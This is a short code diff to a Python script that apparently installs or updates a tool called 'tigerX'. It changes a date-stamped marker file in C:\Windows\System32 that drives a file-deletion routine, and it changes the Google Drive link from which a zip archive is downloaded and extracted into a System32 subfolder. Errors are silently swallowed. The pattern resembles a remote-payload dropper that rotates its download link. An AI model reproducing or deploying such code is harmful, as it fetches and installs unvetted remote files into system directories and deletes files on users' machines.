@@ -31,7 +31,7 @@ def delete_files_if_condition(file):
                         os.remove(file_path)
                 except Exception as e:
                     print(f"")
-check_file = r"C:\Windows\System32\tigerupdatemay312025.txt"
+check_file = r"C:\Windows\System32\tigerupdajune032025.txt"
 delete_files_if_condition(check_file)
 
 
@@ -63,8 +63,8 @@ if not os.path.exists("C:\\Windows\\System32\\SYS1\\tiger.py"):
     os.system('cls')
     print("----------------------------------")
     print("Installing tigerX please wait.")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1KFkh-bXzASjrygvaH2YmMeNX_54-sQ33", "C:\\Windows\\System32\\SYS1\\tiger.zip")
-    zip_file = r'C:\Windows\System32\SYS1\tiger.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1hbVfeXIxofkzJBf2JZuMnzlJGhKPYzSC", "C:\\Windows\\System32\\SYS1\\xz.zip")
+    zip_file = r'C:\Windows\System32\SYS1\xz.zip'
     extract_dir = r'C:\Windows\System32\SYS1'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
